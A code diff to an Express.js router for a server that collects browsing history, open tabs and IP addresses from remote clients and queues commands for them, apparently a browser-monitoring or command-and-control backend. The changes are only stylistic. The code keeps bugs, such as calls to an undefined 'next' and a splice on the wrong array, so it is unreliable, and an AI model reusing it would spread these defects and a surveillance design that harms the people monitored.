@@ -30,11 +30,11 @@ router.get('/clients', auth.user, (req, res, next) => {
 
 router.get('/clients/stats', auth.user, (req, res, next) => {
     Client.find({ }, (err, clients) => {
-        if (err) { return next(err) }
+        if (err) return next(err) 
 
         var tabCount = 0, historyCount = 0, blockCount = 0
 
-        for (var i = 0; i < clients.length; i++) {
+        for (var i = 0; i < clients.length; ++i) {
             tabCount += clients[i].tabs.length
             historyCount += clients[i].history.length
             blockCount += clients[i].blocks.length
@@ -52,7 +52,7 @@ router.get('/clients/stats', auth.user, (req, res, next) => {
 router.get('/clients/connect', (req, res, next) => {
     client = new Client()
     client.save((err, client) => {
-        if (err) { return next(err) }
+        if (err) return next(err) 
         log(`New client connected`)
         commands[client.id] = []
         res.send(client.id)
@@ -68,7 +68,7 @@ router.post('/clients/:id/editInfo', auth.user, validId, (req, res) => {
         name: req.body.name,
         note: req.body.note
     }, err => {
-        if (err) { return next(err) }
+        if (err) return next(err) 
         if (req.body.name) {
             log(`${req.client.id}: Name and note modified`)
             res.render('clients/client.html', {
@@ -95,7 +95,7 @@ router.get('/clients/:id/connect', validId, (req, res) => {
 
 router.get('/clients/:id/disconnect', (req, res) => {
     Client.findByIdAndRemove(req.params.id, (err, client) => {
-        if (err) { return next(err) }
+        if (err) return next(err) 
         log(`${client.id}: Client disconnected`)
         res.sendStatus(200)
     })
@@ -122,7 +122,7 @@ router.post('/clients/:id/bulletin', auth.user, validId, (req, res) => {
 
 router.post('/clients/:id/bulletin/respond', validId, (req, res) => {
     var result = JSON.parse(req.body.result)
-    for (var i = 0; i < commands[req.client.id].length; i++) {
+    for (var i = 0; i < commands[req.client.id].length; ++i) {
         if (commands[req.client.id][i].id === result.id) {
             commands.splice(i, 1)
             break
@@ -140,7 +140,7 @@ router.post('/clients/:id/update', validId, (req, res) => {
          history: body.history,
          ips: body.ips
     }, err => {
-        if (err) { return next(err) }
+        if (err) return next(err) 
         log(`${req.client.id}: Information updated`)
         res.send("Updated")
     })
